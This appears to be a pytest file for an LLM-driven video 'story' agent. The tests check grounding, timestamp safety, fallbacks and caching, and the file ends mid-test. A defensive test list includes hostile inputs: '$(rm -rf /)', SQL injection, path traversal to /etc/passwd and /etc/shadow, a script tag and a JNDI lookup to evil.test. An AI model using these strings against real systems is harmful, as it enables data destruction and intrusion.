"""
Story Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * a beat naming footage nobody analysed is DROPPED, not trusted
  * a beat cannot express a time, even if the model sends one
  * a story built without a brief or without Vision says so, and its
    confidence is capped to match
  * the cache invalidates when ANY of the three upstreams changes
"""

import json

import pytest
from pydantic import ValidationError

from agents.artifacts import (ClipPriority, ContentOpportunity,
                              ContentStrategy, EvidenceItem, Hook,
                              InterestingMoment, KeyPoint, ResearchReport,
                              Story, StoryBeat, TrendItem, VisionAnalysis,
                              VisionClip)
from agents.story import StoryAgent
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY = "01_calm.mp4", "02_lively.mp4"
URL_A = "https://example.test/a"
URL_B = "https://example.test/b"
GHOST = "https://example.test/never-retrieved"


# ------------------------------------------------------------- helpers

def story_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=600, tokens_out=400, usd=0.006)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_vision(clips=(CALM, LIVELY), analysed=True, moments=2):
    return VisionAnalysis(
        domain="model engineering", provider="injected", model="test",
        live=True,
        clips={c: VisionClip(
            clip_id=c, analysed=analysed,
            summary=f"{c} shows the mechanism turning",
            subjects=["a gear train"], actions=["turning"],
            hook_score=80.0 if c == LIVELY else 20.0,
            visual_quality=70.0, confidence=75.0,
            interesting_moments=[
                InterestingMoment(at=1.0 * i, what=f"beat {i}")
                for i in range(moments)])
              for c in clips},
        hook_clip=LIVELY, story="the mechanism is built, then it runs")


def a_strategy(insufficient=False, live=True):
    return ContentStrategy(
        domain="model engineering",
        strategy_type="reasoned", central_topic="a working gear train",
        core_angle="it is simpler than it looks",
        audience="people who build mechanisms",
        objective="make them want to build one",
        hook=Hook(clip_id=LIVELY, description="the mechanism moving",
                  why="motion reads instantly"),
        narrative_direction="open on it running, then show why",
        pacing="fast", pacing_rationale="short attention",
        engagement_strategy="lead with the payoff",
        key_points=[KeyPoint(point="the mechanism actually turns",
                             support="vision", clip_ids=[LIVELY])],
        clip_priorities=[ClipPriority(clip_id=LIVELY, priority=1, role="hook"),
                         ClipPriority(clip_id=CALM, priority=2)],
        vision_available=True, research_available=True,
        insufficient_signal=insufficient, confidence=0.8, live=live)


def a_research(evidence=True, insufficient=False):
    ev = [EvidenceItem(title="Piece A", url=URL_A, snippet="s", source="fake",
                       query="q", retrieved_at=1.0, published_at="2026-09-01"),
          EvidenceItem(title="Piece B", url=URL_B, snippet="s", source="fake",
                       query="q", retrieved_at=1.0,
                       published_at="2026-09-02")] if evidence else []
    return ResearchReport(
        domain="model engineering", research_queries=["q"], provider="fake",
        live=True, model="test", evidence=ev,
        trends=[TrendItem(label="mechanisms", observation="they are popular",
                          evidence_urls=[URL_A], confidence=0.8)]
               if evidence else [],
        content_opportunities=[ContentOpportunity(
            idea="show it running", evidence_urls=[URL_B])] if evidence else [],
        insufficient_signal=insufficient or not evidence, confidence=0.7)


GOOD = {
    "logline": "a gear train built and then run",
    "hook": "the mechanism already moving",
    "setup": "what the parts are",
    "progression": "from parts to motion",
    "payoff": "it turns under its own power",
    "ending": "a last look at it running",
    "themes": ["patience", "mechanism"],
    "beats": [
        {"role": "hook", "clip_id": LIVELY, "moment_ref": 1,
         "narrative": "it is already moving", "why": "motion reads instantly",
         "support": "vision"},
        {"role": "develop", "clip_id": CALM, "moment_ref": 0,
         "narrative": "how the gears mesh", "why": "explains the payoff",
         "support": "research", "evidence_urls": [URL_A]},
        {"role": "ending", "clip_id": LIVELY, "moment_ref": None,
         "narrative": "one last turn", "why": "closes on the payoff",
         "support": "vision"},
    ],
    "risks": ["it may read as a toy"],
    "limitations": ["only two clips"],
    "confidence": 0.8,
}


def run(ctx, tracer_span, clip_set, strategy=None, vision=None, research=None,
        revision=0):
    agent = StoryAgent()
    with tracer_span(ctx, "story") as span:
        return agent.execute(ctx, span, clip_set=clip_set, strategy=strategy,
                             vision=vision, research=research,
                             revision=revision)


@pytest.fixture
def story_ctx(director_ctx):
    ctx, clip_set = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": "model engineering"})})
    return ctx, clip_set


# --------------------------------------------------- 1. a valid story

def test_a_valid_reply_becomes_a_complete_story(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
              a_research())
    p = art.payload

    assert isinstance(p, Story)
    assert p.story_type == "reasoned"
    assert p.logline == "a gear train built and then run"
    assert p.hook and p.setup and p.progression and p.payoff and p.ending
    assert p.themes == ["patience", "mechanism"]
    assert len(p.beats) == 3
    assert p.live is True
    assert not p.insufficient_signal
    assert art.degraded is False and art.fallback_used is None


def test_the_narrative_structure_is_all_present(story_ctx, tracer_span):
    """hook, setup, beats, progression, payoff, ending - all six."""
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    for field in ("hook", "setup", "progression", "payoff", "ending"):
        assert getattr(p, field), f"{field} is empty"
    assert p.beats


def test_the_envelope_is_complete(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
              a_research())
    assert art.artifact_id and art.job_id == ctx.job.job_id
    assert art.kind == "Story"
    assert art.schema_version >= 1 and art.revision == 0
    assert art.produced_by == "story"
    assert art.produced_at > 0 and art.inputs_hash and art.trace_id
    assert 0.0 <= art.confidence <= 1.0
    assert art.cost is not None


# -------------------------------- 2. all three upstreams consumed

def test_strategy_vision_and_research_all_reach_the_prompt(story_ctx,
                                                           tracer_span):
    ctx, clip_set = story_ctx
    seen = []
    ctx.llm = story_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_strategy(), a_vision(), a_research())
    prompt = seen[0]

    assert "THE BRIEF" in prompt
    assert "a working gear train" in prompt
    assert "THE FOOTAGE" in prompt
    assert "shows the mechanism turning" in prompt
    assert "OUTSIDE EVIDENCE" in prompt
    assert URL_A in prompt
    # moments offered BY INDEX, never as times
    assert "reference these BY INDEX" in prompt
    assert "[0] beat 0" in prompt
    # and no raw JSON dump of any upstream
    assert '"insufficient_signal"' not in prompt
    assert '"candidate_windows"' not in prompt


def test_provenance_is_recorded_on_the_artifact(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.strategy_available is True
    assert p.vision_available is True
    assert p.research_available is True
    assert URL_A in p.research_basis
    assert LIVELY in p.vision_basis


# ------------------------------------------- 3. degraded upstreams

def test_no_strategy_still_produces_a_story_and_says_so(story_ctx,
                                                        tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, None, a_vision()).payload
    assert p.beats
    assert p.strategy_available is False
    assert any("without a usable content strategy" in x
               for x in p.limitations)
    assert p.confidence <= 0.6


def test_an_insufficient_strategy_does_not_count_as_a_brief(story_ctx,
                                                            tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_strategy(insufficient=True),
            a_vision()).payload
    assert p.strategy_available is False


def test_no_vision_drops_every_beat_because_nothing_is_verifiable(story_ctx,
                                                                  tracer_span):
    """Without Vision no clip is analysed, so no beat can be grounded."""
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    p = run(ctx, tracer_span, clip_set, a_strategy(), None).payload
    assert p.beats == [], "a beat about unanalysed footage must not survive"
    assert p.vision_available is False
    assert p.insufficient_signal is True
    assert any("without visual understanding" in x for x in p.limitations)


def test_no_vision_prompt_forbids_describing_unseen_footage(story_ctx,
                                                            tracer_span):
    ctx, clip_set = story_ctx
    seen = []
    ctx.llm = story_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_strategy(), None)
    assert "No semantic analysis is available" in seen[0]
    assert "Do NOT describe content you were not told about" in seen[0]


def test_no_research_prompt_forbids_inventing_evidence(story_ctx,
                                                       tracer_span):
    ctx, clip_set = story_ctx
    seen = []
    ctx.llm = story_llm(GOOD, record=seen)
    run(ctx, tracer_span, clip_set, a_strategy(), a_vision(), None)
    assert "None available" in seen[0]
    assert "Do NOT state trends" in seen[0]


def test_all_three_missing_still_produces_a_valid_story(story_ctx,
                                                        tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, None, None, None)
    assert isinstance(art.payload, Story)
    assert art.payload.confidence <= 0.25
    assert len(art.payload.limitations) >= 2


# --------------------------------- 4. clip / moment validation

def test_a_beat_naming_an_unanalysed_clip_is_dropped(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "narrative": "kept"},
        {"role": "develop", "clip_id": CALM, "narrative": "dropped"}]})
    # Vision analysed only LIVELY
    p = run(ctx, tracer_span, clip_set, a_strategy(),
            a_vision(clips=(LIVELY,))).payload
    assert [b.clip_id for b in p.beats] == [LIVELY]
    assert any("never analysed" in x for x in p.limitations)


def test_a_beat_naming_a_clip_that_does_not_exist_is_dropped(story_ctx,
                                                             tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": "99_invented.mp4", "narrative": "nope"},
        {"role": "ending", "clip_id": LIVELY, "narrative": "kept"}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert [b.clip_id for b in p.beats] == [LIVELY]


def test_surviving_beats_are_renumbered_contiguously(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": "99_ghost.mp4"},
        {"role": "setup", "clip_id": LIVELY, "narrative": "a"},
        {"role": "develop", "clip_id": "98_ghost.mp4"},
        {"role": "ending", "clip_id": CALM, "narrative": "b"}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert [b.index for b in p.beats] == [1, 2]


def test_a_moment_reference_is_an_index_into_measured_moments(story_ctx,
                                                              tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "moment_ref": 2}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(),
            a_vision(moments=3)).payload
    assert p.beats[0].moment_ref == 2


@pytest.mark.parametrize("ref", [9, -1, 2.5, "1", True, {"a": 1}])
def test_an_invalid_moment_reference_is_discarded(story_ctx, tracer_span, ref):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "moment_ref": ref}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(),
            a_vision(moments=2)).payload
    assert p.beats[0].moment_ref is None
    assert any("does not exist" in x for x in p.limitations)


def test_a_moment_reference_with_no_moments_measured_is_discarded(story_ctx,
                                                                  tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "moment_ref": 0}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(),
            a_vision(moments=0)).payload
    assert p.beats[0].moment_ref is None


def test_a_clip_may_legitimately_repeat_across_beats(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)     # LIVELY appears in beat 1 and beat 3
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert p.clip_order.count(LIVELY) == 2


# ------------------------------------ 5. research grounding

def test_a_citation_that_was_never_retrieved_is_stripped(story_ctx,
                                                         tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "narrative": "3x the views",
         "support": "research", "evidence_urls": [GHOST]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.beats[0].evidence_urls == []
    assert p.beats[0].support == "vision", "an invented citation cannot add research"
    assert GHOST not in p.research_basis
    assert any("never retrieved" in x for x in p.limitations)


def test_a_real_citation_is_kept_and_upgrades_support(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "evidence_urls": [URL_A]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.beats[0].evidence_urls == [URL_A]
    assert p.beats[0].support == "both"


def test_a_mixed_citation_list_keeps_only_the_real_one(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY,
         "evidence_urls": [URL_A, GHOST]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.beats[0].evidence_urls == [URL_A]


def test_a_citation_with_no_research_at_all_cannot_ground_a_beat(story_ctx,
                                                                 tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "evidence_urls": [URL_A]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(), None).payload
    assert p.beats[0].evidence_urls == []
    assert p.research_basis == []


def test_support_is_derived_not_taken_from_the_claim(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "support": "both",
         "evidence_urls": [GHOST]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.beats[0].support == "vision"


# ------------------------------------------- 6. timestamp safety

def test_the_schema_makes_a_timestamp_structurally_impossible():
    for bad in ({"start": 10.5}, {"end": 20.0}, {"duration": 4.0},
                {"at": 3.2}, {"in_point": 1.0}, {"seconds": 9}):
        with pytest.raises(ValidationError):
            StoryBeat(index=1, clip_id=LIVELY, **bad)
    with pytest.raises(ValidationError):
        Story(total_duration=30.0)


def test_no_field_of_the_story_can_hold_a_time():
    banned = {"start", "end", "duration", "at", "in_point", "out_point",
              "timestamp", "offset", "seconds", "t", "total_duration"}
    for model in (Story, StoryBeat):
        assert not (set(model.model_fields) & banned), model.__name__


def test_a_model_sending_timestamps_is_ignored_not_obeyed(story_ctx,
                                                          tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "narrative": "x",
         "start": 10.5, "end": 20.0, "duration": 9.5, "at": 3.0}]})
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    dumped = json.dumps(art.payload.model_dump())
    assert "10.5" not in dumped
    assert '"start"' not in dumped and '"duration"' not in dumped
    assert len(art.payload.beats) == 1


def test_beat_indices_must_be_contiguous():
    with pytest.raises(ValidationError):
        Story(beats=[StoryBeat(index=1, clip_id="a"),
                     StoryBeat(index=3, clip_id="b")])


# ------------------------------------ 7. malformed / invalid output

@pytest.mark.parametrize("junk", ["not json at all", "", "[1,2,3]",
                                  '{"logline": '])
def test_malformed_replies_fall_back_rather_than_crash(story_ctx, tracer_span,
                                                       junk):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(junk)
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert isinstance(art.payload, Story)


def test_a_failed_call_falls_back(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = failing_llm()
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    assert art.degraded is True and art.payload.live is False


def test_junk_types_in_every_field_are_survived(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({
        "logline": {"a": 1}, "hook": ["x"], "setup": True,
        "progression": None, "payoff": 42, "ending": {"n": 2},
        "themes": "not a list", "beats": "not a list",
        "risks": None, "limitations": {"a": 1}, "confidence": "high",
    })
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert p.logline == "" and p.hook == ""
    assert p.setup == "", "a bool must not become text"
    assert p.payoff == "42"
    assert p.themes == [] and p.beats == []
    assert p.confidence == 0.0


@pytest.mark.parametrize("bad", ["narrator", "HOOK", "", None, 7])
def test_an_invalid_beat_role_falls_back_to_develop(story_ctx, tracer_span,
                                                    bad):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": bad, "clip_id": LIVELY}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert p.beats[0].role == "develop"


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(story_ctx, tracer_span, bad):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "confidence": bad})
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    assert 0.0 <= art.payload.confidence <= 1.0
    assert 0.0 <= art.confidence <= 1.0


def test_the_number_of_beats_is_bounded(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "develop", "clip_id": LIVELY}] * 200})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert len(p.beats) <= 10


def test_absurdly_long_strings_are_capped(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    huge = "A" * 100_000
    ctx.llm = story_llm({**GOOD, "logline": huge, "hook": huge,
                         "progression": huge, "themes": [huge] * 50,
                         "beats": [{"role": "hook", "clip_id": LIVELY,
                                    "narrative": huge, "why": huge}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert len(p.logline) <= 240
    assert len(p.hook) <= 300
    assert len(p.progression) <= 400
    assert len(p.themes) <= 8
    assert len(p.beats[0].narrative) <= 300


# ------------------------------------------- 8. malicious strings

MALICIOUS = [
    "$(rm -rf /)", "; DROP TABLE artifacts; --", "../../../../etc/passwd",
    "C:\\Windows\\System32\\cmd.exe", "crop=in_w:in_h:0:0,scale=-1:720",
    "' OR '1'='1", "<script>alert(1)</script>", "file:///etc/shadow",
    "\x00truncated", "${jndi:ldap://evil.test/x}",
]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_string_stays_inert_data(story_ctx, tracer_span, payload):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "logline": payload, "hook": payload,
                         "risks": [payload]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert isinstance(p.logline, str) and len(p.logline) <= 240
    again = Story.model_validate_json(p.model_dump_json())
    assert isinstance(again.logline, str)


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_clip_id_never_becomes_a_beat(story_ctx, tracer_span,
                                                  payload):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": payload, "narrative": "x"}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert p.beats == []


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_url_is_not_accepted_as_evidence(story_ctx, tracer_span,
                                                     payload):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": LIVELY, "evidence_urls": [payload]}]})
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
            a_research()).payload
    assert p.beats[0].evidence_urls == []
    assert payload not in p.research_basis


# ------------------------------------ 9. fallback with no key

def test_with_no_api_key_a_real_story_is_still_produced(story_ctx,
                                                        tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    assert not ctx.llm.available()

    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
              a_research())
    p = art.payload

    assert art.degraded is True
    assert art.fallback_used and "deterministic" in art.fallback_used
    assert p.live is False and p.model is None
    assert p.story_type == "degraded"
    assert p.beats, "the fallback must still order the clips"
    assert p.confidence == 0.0
    assert any("not authored" in x for x in p.limitations)


def test_the_fallback_orders_by_the_strategy_when_there_is_one(story_ctx,
                                                               tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert p.clip_order[0] == LIVELY        # priority 1 in the strategy
    assert p.beats[0].role == "hook"
    assert p.beats[-1].role == "ending"
    assert "ContentStrategy clip priorities" in p.beats[0].why


def test_the_fallback_orders_by_vision_when_there_is_no_strategy(story_ctx,
                                                                 tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, None, a_vision()).payload
    assert p.clip_order[0] == LIVELY        # hook_score 80 vs 20
    assert "Vision hook scores" in p.beats[0].why


def test_the_fallback_orders_by_measurement_with_nothing_else(story_ctx,
                                                              tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, None, None).payload
    assert p.beats
    assert "measured motion" in p.beats[0].why


def test_the_fallback_does_not_invent_a_narrative(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, None, None).payload
    assert p.hook == "", "a fallback must not invent a hook"
    assert p.setup == "" and p.payoff == "" and p.ending == ""
    assert p.themes == []


def test_the_fallback_never_emits_a_moment_reference(story_ctx, tracer_span):
    """It has no basis to choose one, so it does not pretend to."""
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    p = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload
    assert all(b.moment_ref is None for b in p.beats)


# --------------------------------------------- 10. cache behaviour

def test_identical_inputs_hit_the_cache(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    calls = []
    ctx.llm = story_llm(GOOD, record=calls)
    s, v, r = a_strategy(), a_vision(), a_research()

    first = run(ctx, tracer_span, clip_set, s, v, r, revision=0)
    second = run(ctx, tracer_span, clip_set, s, v, r, revision=1)

    assert second.artifact_id == first.artifact_id
    assert second.revision == 0
    assert len(calls) == 1, "the model must not be called twice"


def test_the_cache_invalidates_when_the_strategy_changes(story_ctx,
                                                         tracer_span):
    ctx, clip_set = story_ctx
    calls = []
    ctx.llm = story_llm(GOOD, record=calls)
    v, r = a_vision(), a_research()
    first = run(ctx, tracer_span, clip_set, a_strategy(), v, r, revision=0)

    changed = a_strategy().model_copy(
        update={"central_topic": "something else entirely"})
    second = run(ctx, tracer_span, clip_set, changed, v, r, revision=1)

    assert second.inputs_hash != first.inputs_hash
    assert len(calls) == 2


def test_the_cache_invalidates_when_vision_changes(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    s, r = a_strategy(), a_research()
    first = run(ctx, tracer_span, clip_set, s, a_vision(), r, revision=0)

    changed = a_vision()
    changed = changed.model_copy(update={"clips": {
        c: vc.model_copy(update={"summary": "a totally different reading"})
        for c, vc in changed.clips.items()}})
    second = run(ctx, tracer_span, clip_set, s, changed, r, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_invalidates_when_research_changes(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    s, v = a_strategy(), a_vision()
    first = run(ctx, tracer_span, clip_set, s, v, a_research(), revision=0)

    changed = a_research().model_copy(update={"trends": [
        TrendItem(label="a different trend", observation="new",
                  evidence_urls=[URL_A], confidence=0.5)]})
    second = run(ctx, tracer_span, clip_set, s, v, changed, revision=1)
    assert second.inputs_hash != first.inputs_hash


def test_the_cache_is_not_time_based(story_ctx, tracer_span):
    import time as _t
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    agent = StoryAgent()
    s, v, r = a_strategy(), a_vision(), a_research()
    with tracer_span(ctx, "story") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, strategy=s, vision=v,
                          research=r, revision=0)
    _t.sleep(1.1)
    with tracer_span(ctx, "story") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, strategy=s, vision=v,
                          research=r, revision=1)
    assert a.inputs_hash == b.inputs_hash


# --------------------------------------- 11. trace + decisions

def test_the_trace_id_reaches_the_artifact(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    agent = StoryAgent()
    with tracer_span(ctx, "story") as span:
        art = agent.execute(ctx, span, clip_set=clip_set,
                            strategy=a_strategy(), vision=a_vision())
        assert art.trace_id == span.trace_id
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "story"]
    assert rows and art.artifact_id in rows[-1]["output_artifacts"]


def test_the_llm_call_is_recorded_in_the_trace(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "story"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools
    assert rows[-1]["tokens_in"] == 600 and rows[-1]["tokens_out"] == 400


def test_the_fallback_is_recorded_in_the_trace(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "story"]
    assert rows[-1]["fallback_used"]


def test_a_dropped_beat_is_noted_in_the_trace(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm({**GOOD, "beats": [
        {"role": "hook", "clip_id": "99_ghost.mp4"}]})
    run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    rows = [r for r in ctx.tracer.for_job(ctx.job.job_id)
            if r["node"] == "story"]
    notes = " ".join(n for r in rows for n in r["notes"])
    assert "never analysed" in notes


def test_decisions_use_the_existing_closed_enum(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
              a_research())
    assert art.decisions
    allowed = {"llm", "measurement", "policy", "human", "fallback"}
    for d in art.decisions:
        assert d.what and d.chose and d.why
        assert d.decided_by in allowed, "the closed enum must not be widened"
        assert 0.0 <= d.confidence <= 1.0
    whats = {d.what for d in art.decisions}
    assert "Evidence the story was built from" in whats
    assert "Beat sequence" in whats
    assert "Narrative order" in whats


def test_the_evidence_decision_names_all_three_sources(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision(),
              a_research())
    d = next(d for d in art.decisions
             if d.what == "Evidence the story was built from")
    assert d.chose == "ContentStrategy + Vision + Research"
    assert d.decided_by == "measurement"


def test_the_fallback_attributes_nothing_to_an_llm(story_ctx, tracer_span):
    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    art = run(ctx, tracer_span, clip_set, a_strategy(), a_vision())
    kinds = {d.decided_by for d in art.decisions}
    assert "fallback" in kinds
    assert "llm" not in kinds, "no model ran, so nothing may be attributed to one"


# ------------------------------- 12. the story reaches the edit

def test_the_director_receives_the_narrative(story_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = story_ctx
    ctx.llm = story_llm(GOOD)
    story = run(ctx, tracer_span, clip_set, a_strategy(), a_vision()).payload

    seen = []
    ctx.llm = story_llm({"strategy": "s", "opening_rationale": "r",
                         "segments": [{"clip_id": LIVELY,
                                       "target_seconds": 4.0,
                                       "reason": "x"}],
                         "rejected": []}, record=seen)
    with tracer_span(ctx, "editing_director") as span:
        EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                       story=story, revision=0)

    prompt = seen[0]
    assert "THE NARRATIVE" in prompt
    assert "a gear train built and then run" in prompt
    assert "hook" in prompt and LIVELY in prompt
    # the director still owns the timing
    assert "You do NOT choose timestamps" in prompt


def test_a_changed_narrative_invalidates_the_edit_plan_cache(story_ctx,
                                                             tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    agent = EditingDirectorAgent()
    one = Story(logline="one", beats=[StoryBeat(index=1, role="hook",
                                                clip_id=LIVELY)])
    two = Story(logline="two", beats=[StoryBeat(index=1, role="hook",
                                                clip_id=CALM)])
    with tracer_span(ctx, "editing_director") as span:
        a = agent.execute(ctx, span, clip_set=clip_set, story=one, revision=0)
    with tracer_span(ctx, "editing_director") as span:
        b = agent.execute(ctx, span, clip_set=clip_set, story=two, revision=1)
    assert a.inputs_hash != b.inputs_hash


def test_the_director_records_that_it_acted_on_a_narrative(story_ctx,
                                                           tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = story_ctx
    ctx.llm = LLMClient()
    story = Story(logline="a gear train", live=True, confidence=0.8,
                  beats=[StoryBeat(index=1, role="hook", clip_id=LIVELY)])
    with tracer_span(ctx, "editing_director") as span:
        art = EditingDirectorAgent().execute(ctx, span, clip_set=clip_set,
                                             story=story, revision=0)
    d = next(d for d in art.decisions
             if d.what == "Narrative from the Story agent")
    assert f"hook:{LIVELY}" in d.chose
    assert d.decided_by == "policy"


def test_the_director_works_with_no_narrative_at_all(story_ctx, tracer_span):
    from agents.editing_director import EditingDirectorAgent

    ctx, clip_set = story_ctx
